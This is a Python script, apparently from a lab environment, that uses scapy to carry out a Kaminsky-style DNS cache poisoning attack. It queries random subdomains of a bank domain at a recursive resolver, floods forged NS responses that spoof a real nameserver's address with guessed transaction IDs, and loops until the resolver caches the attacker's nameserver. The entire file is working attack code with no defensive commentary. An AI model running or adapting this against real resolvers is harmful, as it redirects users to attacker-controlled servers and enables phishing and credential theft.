import os
import random
from socket import AF_INET, SOCK_DGRAM, socket

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, sendpfast, Ether

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind((os.environ['ATK_SERVER_IP'], 1234))

# Vulnerable recursive DNS server settings
target_dns_ip = os.environ['VLN_SERVER_IP']
target_dns_port_in = int(os.environ['VLN_DNS_PORT_IN'])
target_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])

# Target domain base to be messed with
target_domain_base = ".bank.com"
# Authoritative NS for the target domain
known_ns_domain = "ns01.cashparking.com."
known_ns_ip = "216.69.185.38"

# Malicious DNS server
attacker_dns_ip = os.environ['ATK_SERVER_IP']
expected_ip = os.environ['ATK_FORGED_IP']


def initial_request(domain, ip, port):
    return Ether() / IP(dst=ip) / UDP(dport=port) / DNS(
        id=42,
        qr=0,
        rd=1,
        ra=0,
        qdcount=1,
        ancount=0,
        nscount=0,
        arcount=0,
        qd=DNSQR(qname=domain, qtype='A', qclass='IN')
    )


def forged_ns_response(id, target_domain, target_ip, attacker_dns_ip, known_ns_domain, known_ns_ip, dst_port):
    response = Ether() / IP(src=known_ns_ip, dst=target_ip) / UDP(dport=dst_port) / DNS(
        id=id,  # Query ID / transaction id
        qr=1,  # QR (Query / Response) 1=response
        opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
        aa=0,  # Set to 1 in a server response if this dns_response is Authoritative, 0 if not.
        tc=0,
        # Set to 1 in a server response if the dns_response can't fit in the 512-byte limit of a UDP packet response
        rd=1,  # RD (Recursion Desired)
        ra=0,  # RA (Recursion Available), set by server: will (1) or won't (0) support recursion
        z=0,  # This is reserved and must be zero
        rcode=0,  # Response code from the server: indicates success or failure
        # 0:"ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 5:"refused"
        qdcount=1,  # Question record count
        ancount=0,  # Answer count
        nscount=1,  # authority count
        arcount=1,  # additional record count
        # AD and CD bits are defined in RFC 2535
        ad=0,  # # Authentic Data
        cd=0,  # Checking Disabled (0/1)
        # DNS Question Record
        qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
        # DNS Resource Record
        an=0,
        ns=DNSRR(rrname=target_domain, type='NS', rdata=known_ns_domain, ttl=253643),
        ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=253643)
    )
    return response


counter = 0
while True:
    target_domain = "www" + str(counter) + target_domain_base
    counter = (counter + 1) % (2 ** 16)

    packet_list = [initial_request(target_domain, target_dns_ip, target_dns_port_in)]

    response_amount = 50
    r = random.randint(0, (2 ** 16) - response_amount + 1)
    for i in range(r, r + response_amount):
        packet_list.append(
            forged_ns_response(i, target_domain, target_dns_ip, attacker_dns_ip, known_ns_domain, known_ns_ip,
                               target_dns_port_out))

    p_txid_match = (1 / (2 ** 16)) * response_amount * counter * 100
    print("Iteration: {}, possible cache poisoning: {:4.2f}%".format(counter, p_txid_match))
    print("Sending packets from {} with id in interval [{}, {}] to {}".format(known_ns_ip, r, r + response_amount,
                                                                              target_domain))

    sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)

    dns_response = sr1(IP(dst=target_dns_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=target_domain)), verbose=0)

    try:
        if dns_response[DNS].an.rdata == expected_ip:
            print("Successfully poisoned the zone of {}".format(target_domain_base))
            break
    except:
        print("Poisoning failed")

